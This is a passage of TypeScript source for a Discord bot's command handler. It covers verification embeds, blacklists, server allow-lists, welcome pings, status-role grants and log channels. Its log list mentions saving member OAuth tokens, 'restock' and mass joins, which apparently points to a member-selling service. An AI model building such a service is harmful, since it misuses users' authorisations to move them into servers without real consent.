        embeds: [E.statusEmbed(client, state.botStartTime)],
      });
      const { setLiveMessage: setLiveMsg } = await import("../storage/liveMessages.js");
      setLiveMsg(state.liveMessages, "status", { channelId: msg.channelId, messageId: msg.id });
      await i.reply({
        content: "✅ Live status embed posted (refreshes every 30s).",
        ephemeral: true,
      });
      return;
    }

    case "send_verify": {
      if (!(await ownerGuard(i))) return;
      await i.deferReply({ ephemeral: true });
      const channelOpt = i.options.getChannel("channel");
      const targetChannelId = channelOpt ? channelOpt.id : i.channelId!;
      const imageAttachment = i.options.getAttachment("image");
      const imageUrl = imageAttachment?.url ?? null;
      const { embed, components } = E.verifyEmbed(imageUrl);
      const { getVerifyClient } = await import("./verifyBot.js");
      const verifyClient = getVerifyClient();
      let usingBot2 = false;
      if (verifyClient) {
        try {
          const ch = await verifyClient.channels.fetch(targetChannelId);
          if (ch && "send" in ch) {
            await (ch as import("discord.js").TextChannel).send({ embeds: [embed], components });
            usingBot2 = true;
          }
        } catch {
          usingBot2 = false;
        }
      }
      if (!usingBot2) {
        const sendToken = process.env.TOKEN_1 ?? process.env.DISCORD_TOKEN_1 ?? process.env.DISCORD_BOT_TOKEN ?? "";
        if (!sendToken) {
          await i.editReply({ content: "❌ No bot token available to send the embed." });
          return;
        }
        const res = await fetch(`https://discord.com/api/v10/channels/${targetChannelId}/messages`, {
          method: "POST",
          headers: { Authorization: `Bot ${sendToken}`, "Content-Type": "application/json" },
          body: JSON.stringify({
            embeds: [embed.toJSON()],
            components: components.map((r) => r.toJSON()),
          }),
        });
        if (!res.ok) {
          const err = await res.text().catch(() => "");
          await i.editReply({
            content: `❌ Failed to post embed (HTTP ${res.status}).\n\`\`\`${err.slice(0, 300)}\`\`\`\n⚠️ Set \`DISCORD_TOKEN_2\` to post as the dedicated verification bot.`,
          });
          return;
        }
      }
      await i.editReply({
        content: `✅ Verification embed posted in <#${targetChannelId}> using **${usingBot2 ? "Bot 2 (verification bot)" : "Bot 1 (fallback)"}**.${!usingBot2 ? "\n💡 Set `DISCORD_TOKEN_2` to post as the dedicated verification bot." : ""}`,
      });
      return;
    }

    // ─── Super-owner / private commands ──────────────────────────────────
    case "blacklist": {
      if (!(await superOwnerGuard(i))) return;
      const uid = i.options.getString("user_id", true).trim();
      if (!/^\d{5,25}$/.test(uid)) {
        await i.reply({ content: "❌ That doesn't look like a Discord user ID.", ephemeral: true });
        return;
      }
      if (uid === SUPER_OWNER_ID) {
        await i.reply({ content: "❌ You can't blacklist yourself.", ephemeral: true });
        return;
      }
      const added = addBlacklisted(uid);
      await i.reply({
        content: added
          ? `⛔ <@${uid}> (\`${uid}\`) has been **blacklisted**.`
          : `ℹ️ <@${uid}> is already blacklisted.`,
        ephemeral: true,
      });
      if (added) {
        await sendBotLog(client, i.guildId!, new EmbedBuilder()
          .setTitle("⛔ User Blacklisted")
          .setColor(COLOR.red)
          .addFields(
            { name: "🎯 Target", value: `<@${uid}> (\`${uid}\`)`, inline: true },
            { name: "👤 By", value: `<@${i.user.id}>`, inline: true },
          )
          .setTimestamp());
      }
      return;
    }
    case "unblacklist": {
      if (!(await superOwnerGuard(i))) return;
      const uid = i.options.getString("user_id", true).trim();
      const removed = removeBlacklisted(uid);
      await i.reply({
        content: removed
          ? `✅ <@${uid}> (\`${uid}\`) has been **unblacklisted**.`
          : `ℹ️ <@${uid}> was not on the blacklist.`,
        ephemeral: true,
      });
      if (removed) {
        await sendBotLog(client, i.guildId!, new EmbedBuilder()
          .setTitle("✅ User Unblacklisted")
          .setColor(COLOR.green)
          .addFields(
            { name: "🎯 Target", value: `<@${uid}> (\`${uid}\`)`, inline: true },
            { name: "👤 By", value: `<@${i.user.id}>`, inline: true },
          )
          .setTimestamp());
      }
      return;
    }
    case "blacklist_list": {
      if (!(await superOwnerGuard(i))) return;
      await i.reply({ embeds: [E.blacklistListEmbed()], ephemeral: true });
      return;
    }
    case "enable_server": {
      if (!(await superOwnerGuard(i))) return;
      const sid = i.options.getString("server_id", true).trim();
      if (!/^\d{5,25}$/.test(sid)) {
        await i.reply({ content: "❌ That doesn't look like a Discord server ID.", ephemeral: true });
        return;
      }
      if (sid === MAIN_GUILD_ID) {
        await i.reply({ content: "ℹ️ The main server is always allowed.", ephemeral: true });
        return;
      }
      const added = addAllowedGuild(sid);
      // Try to register slash commands in the new server (if bot is in it)
      let registered = false;
      try {
        if (client.guilds.cache.has(sid)) {
          await registerCommandsForGuild(sid);
          registered = true;
        }
      } catch (e) {
        console.error("[enable_server] failed to register commands", e);
      }
      const note = registered
        ? "Slash commands have been registered in that server."
        : "The bot isn't in that server yet — invite it, then commands will register automatically.";
      await i.reply({
        content: added
          ? `✅ Server \`${sid}\` is now **allowed** to use this bot.\n${note}`
          : `ℹ️ Server \`${sid}\` was already allowed.\n${note}`,
        ephemeral: true,
      });
      if (added) {
        await sendBotLog(client, i.guildId!, new EmbedBuilder()
          .setTitle("✅ Server Enabled")
          .setColor(COLOR.green)
          .addFields(
            { name: "🏠 Server ID", value: `\`${sid}\``, inline: true },
            { name: "👤 By", value: `<@${i.user.id}>`, inline: true },
          )
          .setTimestamp());
      }
      return;
    }
    case "disable_server": {
      if (!(await superOwnerGuard(i))) return;
      const sid = i.options.getString("server_id", true).trim();
      if (sid === MAIN_GUILD_ID) {
        await i.reply({ content: "❌ You can't disable the main server.", ephemeral: true });
        return;
      }
      const removed = removeAllowedGuild(sid);
      await i.reply({
        content: removed
          ? `✅ Server \`${sid}\` is no longer allowed to use this bot.`
          : `ℹ️ Server \`${sid}\` was not in the allowed list.`,
        ephemeral: true,
      });
      if (removed) {
        await sendBotLog(client, i.guildId!, new EmbedBuilder()
          .setTitle("🚫 Server Disabled")
          .setColor(COLOR.red)
          .addFields(
            { name: "🏠 Server ID", value: `\`${sid}\``, inline: true },
            { name: "👤 By", value: `<@${i.user.id}>`, inline: true },
          )
          .setTimestamp());
      }
      return;
    }
    case "list_allowed_servers": {
      if (!(await superOwnerGuard(i))) return;
      await i.reply({
        embeds: [E.allowedGuildsEmbed(MAIN_GUILD_ID)],
        ephemeral: true,
      });
      return;
    }
    case "autoping_set": {
      if (!(await ownerGuard(i))) return;
      const channel = i.options.getChannel("channel", true);
      const messageOpt = i.options.getString("message");
      const role = i.options.getRole("role");
      const existing = getAutoPing(i.guildId!);
      const message =
        messageOpt?.trim() ||
        existing?.message ||
        "👋 Welcome {user} to **{server}**! You're member #{count}.";

      setAutoPing(i.guildId!, {
        channelId: channel.id,
        message,
        mentionRoleId: role?.id ?? null,
      });

      await i.reply({
        content:
          `✅ Auto-ping enabled in <#${channel.id}>.\n` +
          (role ? `Pinging role: <@&${role.id}>\n` : "") +
          `Message: \`${message}\`\n\n` +
          `Use \`/autoping_test\` to preview it.`,
        ephemeral: true,
        allowedMentions: { parse: [] },
      });
      return;
    }
    case "autoping_clear": {
      if (!(await ownerGuard(i))) return;
      const cleared = clearAutoPing(i.guildId!);
      await i.reply({
        content: cleared
          ? "✅ Auto-ping disabled for this server."
          : "ℹ️ Auto-ping wasn't set up here.",
        ephemeral: true,
      });
      return;
    }
    case "autoping_status": {
      if (!(await ownerGuard(i))) return;
      await i.reply({
        embeds: [E.autoPingStatusEmbed(i.guildId!)],
        ephemeral: true,
      });
      return;
    }
    case "autoping_test": {
      if (!(await ownerGuard(i))) return;
      const cfg = getAutoPing(i.guildId!);
      if (!cfg) {
        await i.reply({
          content: "❌ Auto-ping isn't configured. Use `/autoping_set` first.",
          ephemeral: true,
        });
        return;
      }
      const member = await i.guild!.members.fetch(i.user.id).catch(() => null);
      if (!member) {
        await i.reply({ content: "❌ Couldn't fetch your member info.", ephemeral: true });
        return;
      }
      const r = await sendAutoPing(member, cfg);
      await i.reply({
        content: r.ok
          ? `✅ Test ping sent in <#${cfg.channelId}>.`
          : `❌ Failed: ${r.reason}`,
        ephemeral: true,
      });
      return;
    }

    // ─── Info embeds ────────────────────────────────────────────────────
    case "rules":
    case "tos":
    case "info":
    case "howto":
    case "payment_methods":
    case "invite_rewards":
      await handleInfoCommand(i);
      return;

    case "role_plans":
    case "private_bot":
      if (!(await ownerGuard(i))) return;
      await handleInfoCommand(i);
      return;

    // ─── Status role ─────────────────────────────────────────────────────
    case "status_role_set": {
      if (!(await ownerGuard(i))) return;
      const inviteLink = i.options.getString("invite_link", true).trim();
      const role = i.options.getRole("role", true);
      setStatusRoleConfig(i.guildId!, { inviteLink, roleId: role.id });
      await i.reply({
        content:
          `✅ Status role configured!\n` +
          `• Watching for: \`${inviteLink}\`\n` +
          `• Grants role: <@&${role.id}>\n\n` +
          `Use \`/free_bronze_role\` to post the member-facing embed with the copyable text.\n` +
          `⚠️ Requires the **Presence Intent** enabled in your Discord Developer Portal.`,
        ephemeral: true,
      });
      return;
    }
    case "free_bronze_role": {
      if (!(await ownerGuard(i))) return;
      const inviteLink = i.options.getString("invite_link", true).trim();
      const role = i.options.getRole("role", true);
      const existing = getStatusRoleConfig(i.guildId!);
      setStatusRoleConfig(i.guildId!, {
        inviteLink,
        roleId: role.id,
        logChannelId: existing?.logChannelId,
      });
      const { freeBronzeRoleEmbed } = await import("./infoCommands.js");
      await i.reply({ embeds: [freeBronzeRoleEmbed(inviteLink, role.id)] });
      return;
    }
    case "set_log_channel": {
      if (!(await ownerGuard(i))) return;
      const channel = i.options.getChannel("channel", true);
      setBotLogChannel(i.guildId!, channel.id);
      await i.reply({
        content:
          `✅ Bot logs will now be sent to <#${channel.id}>.\n\n` +
          `**Logged events:**\n` +
          `• 🔑 Member OAuth token saved\n` +
          `• 📦 Restock completed\n` +
          `• 🚀 Mass join (\`/djoin\`) completed\n` +
          `• 🧹 Stock cleared\n` +
          `• ⛔ User blacklisted / unblacklisted\n` +
          `• ✅ Server enabled / disabled\n` +
          `• 👋 Bot auto-left a server\n` +
          `• 🥉 Free bronze role granted / removed`,
        ephemeral: true,
      });
      return;
    }
    case "clear_log_channel": {
      if (!(await ownerGuard(i))) return;
      const cleared = clearBotLogChannel(i.guildId!);
      await i.reply({
        content: cleared ? "✅ Bot log channel removed." : "ℹ️ No log channel was set.",
        ephemeral: true,
      });
      return;
    }
    case "bronze_log_set": {
      if (!(await ownerGuard(i))) return;
      const channel = i.options.getChannel("channel", true);
      const saved = setLogChannel(i.guildId!, channel.id);
      if (!saved) {
        await i.reply({
          content:
            "❌ No status role is configured yet.\n" +
            "Run `/free_bronze_role` or `/status_role_set` first, then set the log channel.",
          ephemeral: true,
        });
        return;
      }
      await i.reply({
        content: `✅ Free bronze role logs will be sent to <#${channel.id}>.`,
        ephemeral: true,
      });
      return;
    }
    case "status_role_clear": {
      if (!(await ownerGuard(i))) return;
      const cleared = clearStatusRoleConfig(i.guildId!);
      await i.reply({
        content: cleared
          ? "✅ Status role config cleared."
          : "ℹ️ No status role was configured in this server.",
        ephemeral: true,
      });
      return;
    }
    case "status_role_status": {
      const cfg = getStatusRoleConfig(i.guildId!);
      if (!cfg) {
        await i.reply({ content: "ℹ️ No status role configured in this server.", ephemeral: true });
      } else {
        await i.reply({
          content:
            `📋 **Status Role Config**\n` +
            `• Watching for: \`${cfg.inviteLink}\`\n` +
            `• Grants role: <@&${cfg.roleId}>`,
          ephemeral: true,
        });
      }
      return;
    }

    default:
      await i.reply({ content: `❌ Unknown command: \`${cmd}\``, ephemeral: true });
  }
}

// Suppress unused-import warning for PermissionFlagsBits
void PermissionFlagsBits;
void PREFIX;
